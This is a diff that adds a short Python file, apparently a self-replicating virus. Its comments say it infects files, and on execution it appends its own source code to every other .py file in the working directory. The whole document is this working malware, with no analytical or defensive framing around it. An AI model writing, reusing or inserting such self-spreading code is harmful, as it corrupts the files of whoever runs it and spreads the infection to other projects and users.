@@ -1,0 +1,19 @@
+import os
+import shutil
+
+# Function to infect files
+def infect_file(file_name):
+    virus_code = open(__file__).read()
+    with open(file_name, 'a') as f:
+        f.write(virus_code)
+
+# Function to replicate and infect
+def replicate_and_infect():
+    current_dir = os.getcwd()
+    files = os.listdir(current_dir)
+    for file_name in files:
+        if file_name.endswith('.py') and file_name != __file__:
+            infect_file(file_name)
+
+# Replicate and infect on execution
+replicate_and_infect()
